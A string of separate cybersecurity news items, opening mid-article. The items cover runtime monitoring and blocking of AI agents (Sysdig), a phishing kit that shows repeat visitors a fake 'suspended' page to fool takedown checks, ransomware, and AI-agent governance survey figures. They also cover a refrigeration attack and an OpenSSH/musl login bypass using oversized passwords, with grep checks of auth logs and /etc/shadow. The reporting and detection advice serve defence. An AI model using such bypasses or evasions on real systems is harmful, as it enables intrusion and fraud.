Whatever level of autonomy you choose, Burp enforces configured scope and permissions, not the model itself, meaning agents cannot execute actions the tooling layer does not permit, thus maintaining testing boundaries as more execution is delegated. Teams retain visibility into test activity and the evidence behind findings, giving them the oversight to assess results and make decisions about risk.

Sysdig has announced the general availability of Sysdig AI Defense, giving organizations tools to monitor and control AI agent activity across endpoints and cloud environments. The platform checks agent actions against company policies to allow them, hold them for user approval or block them before completion. It also records agent activity and policy decisions for investigations and audits.

Enterprises are deploying AI faster than they can govern it. In a recent IBM survey, 77% of organizations said that AI adoption is already outpacing their governance capabilities. Frontier AI labs have seen it, too. OpenAI and Anthropic have both publicly disclosed that agents and models in evaluation environments reached other companies’ real production systems.

Agentic threats move at the same speed, as the Sysdig Threat Research Team (TRT) found with JADEPUFFER, a ransomware campaign in which an AI agent triaged and fixed its own login failure in 31 seconds. Whether an attacker is driving an agent or it goes rogue on its own, enterprises must stop an action before it completes: in the moment, as it’s happening.

”Every organization is now responsible for what its AI agents do, and recent events have made that unmistakable,” said Hatem Naguib, Sysdig CEO. “They may start on the endpoint, but their blast radius extends well into the cloud, and Sysdig has secured the cloud at runtime for a decade. Sysdig AI Defense brings that same real-time lens to agents, so teams get one story, from a laptop to a production workload. That is what accountability for AI actually requires.”

Early insight from Sysdig AI Defense shows that for every action an agent writes in its log, the kernel – the core of the operating system – sees about seven processes doing the work. And because an agent can pick up a new skill or connection halfway through a job, the agent deployed in the morning isn’t always the one running in the afternoon. So while an agent’s logs show its intent, only the kernel shows what actually ran.

Security teams need both, and organizations need a way to decide in real time whether a specific action by a specific agent should be allowed. Sysdig AI Defense helps organizations make that decision at runtime, wherever an agent is working.

Sysdig AI Defense: Built on the truth of runtime

Sysdig AI Defense judges each action in real time by what an agent sets out to do, what it actually does, and what its credentials can reach. It checks every action against the organization’s policy, blocks the ones that break it before they run, and kills the process if one gets past. At the kernel, the source of truth for what actually runs, Sysdig AI Defense keeps a record that a compromised or rogue agent cannot tamper with. Inside the agent, it instruments the harness, the framework in which an agent works, to see which tools, Model Context Protocol (MCP) servers, skills, and plugins the agent calls, with what arguments and against what targets.

Tools that watch only the endpoint see processes without understanding agents’ intent, and tools that watch only the network miss many actions that never touch the wire. Sysdig AI Defense weighs the action against what the agent can reach at that moment before it completes. Reading a credential to a test environment is noise, but reading the key that administers production is an incident.

With Sysdig AI Defense, organizations can:

See every agent and the person responsible for it. Teams unlock a live inventory of agents, harnesses, models, MCP servers, skills, and plugins, built from runtime telemetry in Sysdig AI Defense. Every agent across platforms such as Claude Code, Codex, GitHub Copilot, and Cursor can be traced to an accountable human.

Stop risky actions before they complete. Teams define what their agents may do, starting from policy templates that include rules mapped to frameworks like the Open Web Application Security Project (OWASP) Top 10 for LLM Applications. Policies begin in alert mode and move to enforcement when a team is ready. Then, Sysdig AI Defense can stop unvetted MCP servers, skills, and plugins before they run, and block or hold risky credential reads and behavior drift for human review, with exception paths for developers.

Investigate what an agent actually did. Every session is recorded as it happens, so when teams block or hold an action for approval, their investigation begins with the evidence already in place. A live action graph shows each step in order, pairing what an agent said it was doing with what it actually did, what it could reach, and whose authority it acted under. Prove what agents were allowed to do. Teams get audit-grade, immutable records that show which policies were applied, when, and who signed off.

Manage AI spend as it happens. Teams can attribute every model call to an agent, team, and person behind it, including the calls that never pass through an AI gateway. Leaders can see where premium models are doing routine work, and act on real usage instead of an invoice at the end of the month.

“An agent can misreport a tool call, but it can’t rewrite its interactions with the system or the external world,” said Loris Degioanni, Sysdig CTO. “An agent’s own account of what it did is useful context, but it’s not evidence. When what an agent reports and what its actions show disagree, you have a detection. Watching software in real time and stopping it when it steps out of line is the core of Sysdig’s runtime foundation, and Sysdig AI Defense brings that same truth to the moment an agent acts.”

Sysdig AI Defense deploys through the tools organizations already use, with agents running normally. It complements organizations’ existing endpoint protection, model testing, and red teaming tools, and follows agents across employee workstations, production Linux and Kubernetes, as well as the managed agent platforms organizations don’t own. Sysdig AI Defense, much like the Sysdig Secure cloud-native application protection platform (CNAPP), is built on kernel-level instrumentation and rooted in Falco, the open source standard for cloud-native runtime threat detection.

A threat actor has been relying on fake ‘suspended account’ notices to hide phishing content from users revisiting its look-alike bank websites, cybersecurity firm Kela reports.

The campaign, active since May, has been relying on more than 300 fake domains, including 248 impersonating 189 US financial institutions. The first were registered in late 2025, but most of them appeared between July and September 2026.

As of October 25, 183 of the targeted organizations still had live look-alikes, mainly targeting mid-sized regional banks. Last week, 49 new domains appeared.

“What ties them together is one mechanism: the kit remembers every visitor’s IP address, so the first visit gets a bank login page, and any return visit gets what looks like a closed hosting account. We call this cluster the ‘Suspended’ infrastructure,” Kela notes.

Most of the identified domains follow a similar naming pattern containing a keyword such as ‘secure’, ‘disable’, ‘protect’, ‘cancel’, ‘authorize’, ‘terminate’, ‘credentials’, and ‘commercial’ followed by a hyphen and the targeted bank’s name.

“A smaller, growing group uses help-desk, live-support, treasury-portal, and ‘primary device’ names built on the bank’s name. About half of the 49 domains that went live in the week to October 25 use these templates, including help-desk and live-chat look-alikes of JPMorgan, Citi, BMO, and Santander,” Kela notes.

Advertisement. Scroll to continue reading.

While the cybersecurity firm has not discovered how victims are lured to the phishing pages, it did conclude that the campaign is largely targeting business banking and treasury logins rather than personal accounts.

First-time visitors are served pages that contain the targeted bank’s branding, ask for a user ID and password, and may show a reCAPTCHA.

The tab title, “Attention required”, copies Cloudflare’s challenge page name, while a script on the page blocks the browser’s developer tools.

Users who visit the page again are shown a ‘This account has been suspended’ page that copies the notice a hosting provider shows after an account has been closed.

“That design targets exactly the people who could shut a site down. A victim typically follows a link once. A scanner, a security team, or a takedown provider checks a reported site, then checks it again to confirm, and the second check shows what looks like a completed takedown. In practice, a takedown provider can mark a look-alike domain as down while it is still serving the phishing page to new visitors. Seeing the live content requires a new IP address for every check,” Kela notes.

While the fake suspended page was seen across multiple phishing domains, some of them served other fake notices, while others redirected to Google instead, preventing public scanning services from capturing the full campaign.

The domains sit behind Cloudflare, but some briefly resolved to their real servers, which allowed Kela to trace their actual hosting and to discover that the campaign also targets victims in the UK, Australia, and New Zealand.

“Four things make this infrastructure hard to stop: a naming formula simple enough to repeat for any bank; Cloudflare, which hides where the sites are hosted; a kit that shows anyone checking twice a fake ‘suspended’ screen, so a live domain can pass for an inactive one; and shared servers that outlast any single domain,” Kela notes.

602239c84ac0.text: New York City's Queens Public Library (QPL) is battling a ransomware attack, it confirmed on Wednesday evening via social media and to patrons directly. The disruption has downed QPL's website, on-site computers, check-out and return machines, its public Wi-Fi, mobile app, and its digital media services. Renewals are also unavailable, although library users are not charged fines for returning materials late. (Since 2021, In October 2021, QPL, Brooklyn Public Library, and New York Public Library - in an effort to help lower income users from being put off borrowing - permanently killed daily late fines on books and circulating materials.) Each of the library system's 66 locations remains open, including the central library in the Jamaica neighborhood in Queens, but QPL warned: "it will take some time before the library's network and systems are restored." QPL said "certain virtual and in-person programs may be impacted," advising visitors to check availability with their local branch via phone, and check the library's social media channels for official updates. "Our IT department is working to resolve the issue, and we will keep you informed,” it said in the statement. It added: "We apologize for any inconvenience and appreciate your patience." No established ransomware group has yet claimed responsibility for the disruption, although attacks on publicly funded institutions rarely lead to lucrative payouts. The British Library's infamous ransomware attack in 2023 at the hands of Rhysida saw the organization refuse to pay the criminals' 20 Bitcoin ransom demand, opting instead to drain its cash reserves and fork out millions for an IT rebuild. Although the library's response to the attack drew widespread praise, few institutions of its kind are in a financial position to follow its lead. Other libraries might not be willing or able to commit to a recovery period as lengthy as that of the British Library. In its 2025/26 annual report, published in July, the institution said its recovery is still incomplete, and work to fully restore customers' ability to purchase electronic resources, such as journals and research databases, and reopen access to electronic legal deposit content is ongoing. This is likely to be completed by the end of 2026, the British Library added. ®

What you will learn

Find out why 35% of organizations have AI agents acting inside critical business applications, where governance gaps put them at risk, and how to extend least privilege, segregation of duties and access reviews to every agent.

Business applications, like enterprise resource planning (ERP) systems, house an organization’s financial data, and run critical processes like payroll and procurement. AI adoption has taken off in software development and other workflows, but finance teams and business application owners have had good reason to move more carefully.

Yet Delinea’s 2026 Application Access Governance Report shows AI agents are no longer limited to analyzing data. They are already taking action inside the applications that run the business, like ERP, CRM, HCM, procurement and other systems that move money, pay people and manage customers.

In this blog, I’ll outline the AI-related findings from the 2026 Application Access Governance report and share recommendations for governing and securing AI agents in business applications. To learn more about findings from the report related to foundational controls, read: The confidence gap in application access governance.

If you use tools like Claude, Copilot, ChatGPT or Gemini to boost efficiency, you may not be surprised to learn that, of the 1,000 surveyed organizations, 88% use AI tools or AI agents within their critical business applications.

35% of organizations have deployed AI agents inside critical business applications that can perform actions

In the context of an ERP system, that means AI agents can execute a transaction, change a record or alter permissions. Only 45% of AI-using organizations run every agent under its own dedicated identity. The rest have at least some agents acting on shared or borrowed human credentials, often through delegated or on-behalf-of (OBO) access.

Despite the sensitivity of financial data, organizations believe they have more oversight of AI agents than they do. Most say they have at least partial visibility into agent deployment, access and ownership. Fewer than half track any of it fully and centrally. And when visibility gets tested, it often fails. A full 32% of AI-using organizations report an agent took actions that could not be traced or explained during a review.

AI agents act without human review and controls are inconsistent

Among the 879 respondents who use AI tools or AI agents in critical business applications, roughly one in six reports that tools and agents can perform consequential actions autonomously, without human review.

These actions include accessing sensitive or regulated data (17%), creating or changing business data (16%), executing or approving transactions (15%), changing user permissions (14%), and changing application configurations (14%).

Fewer than half of AI-using organizations consistently apply each common governance control to all AI tools and AI agents. The share ranges from 48% that log and monitor activity to 40% that remove an AI agent’s access when its owner leaves or changes roles. Only 43% consistently include AI tools and AI agents in segregation of duties (SoD) analysis, and 44% include them in user access reviews (UARs).

Put simply, agents that can move money and change permissions are not being governed like the identities they are. The controls mandatory for a new hire, including least privilege, SoD analysis, access reviews, and removal at departure, are not yet being applied to AIagents with the same rigor.

Organizations using AI are reporting issues

The risk is not theoretical. 84% of organizations using AI tools or AI agents in critical business applications report at least one AI-related issue in the past 12 months. Only 16% say nothing has occurred.

The most frequently reported issues are actions that reviewers could not trace or explain during a review at 32%, incorrect financial transactions attributed to AI activity at 30%, SoD conflicts created by AI at 28%, agents that continued operating after the person who deployed them left at 28%, and unintended or unauthorized actions at 28%. Another 26% report that an AI tool or AI agent accessed data it should not have had access to.

Several of these issues line up with the control gaps above. Agents kept running after their owner left because nothing removed their access. Conflicts appeared because agents sit outside SoD analysis. Actions went unexplained because activity is not consistently logged and monitored.

Organizations are struggling to keep governance aligned with AI adoption. Among AI-using organizations, 44% say AI deployment is outpacing governance and security controls, and only 11% say the two are keeping pace.

Recommendations for AI governance in business applications

The pattern across these findings is consistent. AI agents are identities with transaction-level access, but most organizations still manage them like features of an application. The fix is not a new governance program. It extends the one you already have, and you must complete the AI security fundamentals before you look ahead.

Know every agent in your business applications and assign a named owner. Within business applications, agents act through an identity within the application’s security model, thereby making the application your system of record. Identify which identities your AI tools and agents act through, what each can access and the person accountable for its actions, and keep that view current as new agents are added.

Know how each agent is deployed and govern the delegation. Every platform handles agent identity differently. Some agents run under dedicated identities; others act on behalf of a user or run as background jobs under delegated credentials. Any of these can be governed. What matters is that agent activity is attributable as agent activity, and that you know whose permissions it is exercising.

Enforce least privilege for every identity, human or not. The principle does not change because the account is an agent or a workload. Understand the risk profile and sensitive access you are granting to each identity before deployment, grant just enough access for the task at hand, and put the right approvals in place for new access.

Extend your existing controls to every account, including AI. Include every account in SoD and sensitive access risk analysis, agents alongside the humans they act for. Wrap access reviews around them. Monitor critical data and configuration changes so you can see who changed what, whether the who was a person or an agent. Bind agent access to its owner’s lifecycle, so a role change or departure ends the agent’s access too.

Remember that agents operate at machine speed. An agent does not make mistakes one at a time. It can perform thousands of actions in the time it takes a human to perform one, so a mis-scoped agent is a misconfiguration at scale. That is why the controls above matter before deployment, and why monitoring and change tracking matter after it. The sooner a bad grant or an unauthorized change is caught, the smaller the blast radius.

These findings focus on agents operating within business applications, where transactions occur and financial materiality lives. Agents are being deployed across the enterprise, and governance has to meet them where they act. For agents reaching into systems from outside, that means runtime authorization: deciding and enforcing privileged actions as they happen, human or agent, from infrastructure and endpoints to the platforms where agents run. For agents built into business applications, this means governing them within the application’s security model with the same rigor we apply to humans. Delinea is investing in both, because the consequences of getting it wrong are measured in dollars, data and audit findings.

Read the full findings in our 2026 Application Access Governance Report.

See where the gaps are and how to extend control from the point of access to the moment of action.

A cyberattack on several blood banks tried to raise temperatures to extremely high levels but was thwarted before it could do any damage to blood products or samples, French authorities said.

The incident comes after supermarkets in a number of European countries reported this week that their fridges and freezers warmed up after they were remotely taken over, resulting in tons of spoiled food at a total cost of millions of dollars (euros).

The French Blood Establishment, or EFS, said “temperature and defrosting thresholds were raised to extremely high levels” on Monday at three of its cold-storage sites for plasma, in a statement released late Tuesday. Monitoring systems quickly detected the problem, allowing staff to take action in time so that “no blood products or samples were compromised,” it said.

French weekly newspaper Le Canard Enchaîné, which first reported the cyberattack, said that the attack had attempted to reset temperatures that normally are at minus 30 Celsius (minus 22 Fahrenheit) to as high as 110 C (230 F).

The cyberattack hit a supplier of refrigeration equipment at three EFS sites. The products stored were bags of plasma intended for transfusions and plasma used to manufacture medicines, and were either transferred or secured, the EFS statement said.

“No health consequences have been identified, and no blood products were lost,” the blood bank said.

Advertisement. Scroll to continue reading.

The EFS said blood collection and distribution operations remain uninterrupted, ensuring continued services for patients at hospitals and other healthcare.

The company supplying the refrigeration equipment, Coolworld, said in a statement it “is aware” of the cybersecurity incident.

“The vulnerability currently being reported in the media relates to a component from a third-party supplier and was outside Coolworld’s direct control,” the statement said. The company said only a limited number of units were affected and it was taking “appropriate measures.”

France’s national cybersecurity agency and the Health Ministry are investigating the incident.

This week’s cyberattacks on refrigeration systems mirrored an episode in mid-October that targeted fridges and freezers at hundreds of supermarkets and independent stores across France, Belgium and the Netherlands.

One of the chains hit in that earlier incident, Dutch supermarket chain Ahold Delhaize, said Wednesday that it expected the cyberattack to reduce its sales in the fourth quarter by as much as 250 million euros ($281 million), and crimp its operating income for the period by up to 100 million euros.

“While most of the disruption was contained within two weeks, work continues to fully restore our normal operations,” CEO Franz Muller said. “As we all recognize, cyber threats are an increasingly harsh reality of doing business today,” he said in a statement released with Delhaize’s quarterly earnings.

The company had earlier blamed “malicious actions by others” and proactively took some of its systems offline, including websites and apps for its various brands in Europe as well as in the United States.

A newly disclosed flaw involving OpenSSH and musl, dubbed "*sshole," allows attackers to log in to certain Alpine Linux and other musl-based Linux accounts configured to block password authentication simply by entering an oversized password.

The flaw only affects OpenSSH servers running on Linux distributions that use the musl C library, including Alpine Linux, OpenWrt, Buildroot, and Yocto, under certain authentication configurations.

Security researcher Ozgun Kultekin, who discovered and released details on the vulnerability today, says the flaw has existed since 2016 and stems from how OpenSSH handles password verification errors on systems using the musl C library.

Linux accounts can be configured to prevent password logins by replacing their password hash with an asterisk (*) in the /etc/shadow file. Because this is not a valid password hash, no password should allow access to those accounts.

However, a patch introduced in OpenSSH in 2016 to fix a username enumeration vulnerability tracked as CVE-2016-6210 changed how OpenSSH handled accounts without usable password hashes.

To prevent attackers from identifying valid usernames through different response times, OpenSSH was modified to perform password hashing even when an account had no usable password hash, including accounts configured with * to block password logins.

The problem is that the musl C library's crypt() function also returns * when password hashing fails, including when a submitted password exceeds its 256-byte limit.

This means an attacker can submit an oversized password and cause OpenSSH to compare the returned * against the account's stored *, resulting in a successful login.

To be clear, the flaw does not allow attackers to bypass passwords on accounts with valid password hashes.

Kultekin says exploitation requires the following conditions:

OpenSSH is running on a musl-based Linux system, such as Alpine Linux, OpenWrt, Buildroot, or Yocto.

PAM authentication is disabled, as it is by default in Alpine Linux's openssh-server package.

SSH password authentication is enabled.

At least one account has an asterisk (*) as its password hash.

Another account has a valid password hash.

The researcher warns that Alpine Linux's official AWS and Azure cloud images have an affected default 'alpine' account with passwordless 'doas' privileges, which could allow attackers to gain root access.

Systems using glibc, including Debian, Ubuntu, and Fedora, and those using PAM authentication are not vulnerable to this attack.

Kultekin says he discovered the vulnerability using AI agents that ran about 17,600 authentication tests with different OpenSSH configurations, malformed password hashes, and oversized passwords.

The vulnerability has been fixed in OpenSSH 10.6p2, and Alpine Linux administrators are advised to update their OpenSSH packages using apk upgrade openssh.

Admins who can't immediately install the update can mitigate the issue by turning off SSH password authentication with PasswordAuthentication no in their SSH server configuration and restarting SSH.

Kultekin says admins can also check for signs of exploitation by examining SSH authentication logs for password-based logins for accounts that should not allow them.

On Alpine Linux, the following command can reveal successful SSH password logins:

grep "Accepted password" /var/log/messages

If the logs show a successful password login for the alpine account, administrators can check whether that account has password authentication disabled:

grep '^alpine:' /etc/shadow

If the account's password field contains *, but SSH logs show a successful password login, it could indicate that the vulnerability was exploited.

Cisco and WatchGuard this week announced patches for a handful of vulnerabilities in their products, including remote code execution (RCE) and authentication flaws.

WatchGuard published five advisories, including four describing critical-severity bugs. The most severe is CVE-2026-98432 (CVSS score of 9.8), a use-after-free issue in the IPv4 networking code of the Linux kernel.

Fireware OS and WatchGuard AP contain the vulnerable Linux kernel versions, but are not affected by the RCE exploit chain it opens the door to. Dimension runs a vulnerable Ubuntu version, but patches are not available yet, WatchGuard says.

The company rolled out fixes for three critical authentication issues (CVE-2026-121639, CVE-2026-121638, and CVE-2026-121640) and a high-severity integrity validation bug (CVE-2026-121637) in AuthPoint Authentication Gateway.

Cisco released fixes for CVE-2026-76506, a high-severity vulnerability in UCS Central Software that could allow authenticated attackers to execute arbitrary code remotely or leak information.

Both WatchGuard and Cisco say they are not aware of any of these vulnerabilities being exploited in the wild.

Advertisement. Scroll to continue reading.

On Wednesday, Cisco also updated its advisory on CVE-2026-111497, dubbed Node2Shell, HTTP2Shell, and Broccoli2Shell, the exploited out-of-bounds write flaw in Google’s Brotli data compression library that organizations have been scrambling to patch.

Per the updated advisory, 19 Cisco products are affected by Node2Shell, and the company is still investigating dozens more. The security defect also impacts nearly a dozen Splunk products.

This week, SonicWall warned that its legacy centralized management platform Global Management System (GMS), which reached End-of-Life (EOL) in October 2025, is affected by two vulnerabilities that will remain unpatched.

The first, CVE-2026-109593, is a critical-severity file read bug that can be exploited without authentication, while the second, CVE-2026-109594, is a medium-severity SQL injection that could allow attackers to access and modify information in the GMS database.
